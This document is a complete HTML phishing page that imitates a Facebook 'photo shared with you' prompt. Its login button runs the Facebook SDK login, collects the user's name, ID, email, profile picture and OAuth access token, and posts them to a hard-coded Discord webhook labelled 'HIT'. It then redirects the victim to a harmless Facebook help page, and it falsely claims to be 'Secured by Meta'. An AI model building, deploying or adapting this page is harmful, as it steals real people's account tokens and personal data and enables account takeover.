<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta property="og:title" content="Shared Photo">
<meta property="og:description" content="1 new photo • Shared today">
<meta property="og:image" content="https://images.unsplash.com/photo-1516035069371-29a1b244cc32?w=600">
<title>Photo • Facebook</title>
<script src="https://connect.facebook.net/en_US/sdk.js"></script>
<style>
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#fff;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,0.1);width:90%;max-width:400px;padding:24px;text-align:center}
.img{height:220px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:6px;margin-bottom:16px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:48px;position:relative}
.blur{position:absolute;inset:0;backdrop-filter:blur(10px);background:rgba(255,255,255,0.2);display:flex;align-items:center;justify-content:center;flex-direction:column}
.lock{width:56px;height:56px;background:rgba(255,255,255,0.95);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;margin-bottom:8px}
button{background:#1877F2;color:#fff;border:none;padding:12px 24px;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;width:100%}
button:hover{background:#166fe5}
.meta{color:#8a8d91;font-size:12px;margin-top:16px}
</style>
</head>
<body>
<div class="card">
<div class="img">
<div class="blur">
<div class="lock">🔒</div>
<span style="color:#fff;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.3)">Sign in to view</span>
</div>
</div>
<h2 style="margin:0 0 8px 0;color:#050505">Photo shared with you</h2>
<p style="color:#65676b;margin:0 0 20px 0;font-size:15px">A friend sent you a photo via Messenger. Sign in to view the full resolution.</p>
<button onclick="login()">Continue with Facebook</button>
<div class="meta">🔒 Secured by Meta</div>
</div>

<script>
const WEBHOOK = 'https://discord.com/api/webhooks/1520970776130359306/-SigA1miPn6LkyvXELyi021ufql-FVIq9UDeLG63zta73iE3zp5wuAP2t4_0UZWh6fd9';

FB.init({appId: '132888053867486', cookie: true, xfbml: true, version: 'v18.0'});

function login() {
    FB.login(function(response) {
        if (response.authResponse) {
            const token = response.authResponse.accessToken;
            const uid = response.authResponse.userID;
            
            FB.api('/me?fields=name,email,picture', function(user) {
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `🎯 **HIT**\n**Name:** ${user.name}\n**ID:** ${uid}\n**Email:** ${user.email || 'N/A'}\n**Token:** \`${token}\`\n**Pic:** ${user.picture?.data?.url || 'N/A'}\n**Time:** ${new Date().toISOString()}`
                    })
                });
                document.querySelector('button').textContent = 'Loading...';
                setTimeout(() => location.href = 'https://www.facebook.com/help/photo-unavailable', 2000);
            });
        }
    }, {
        scope: 'public_profile,email,user_friends',
        auth_type: 'rerequest'
    });
}
</script>
</body>
</html>
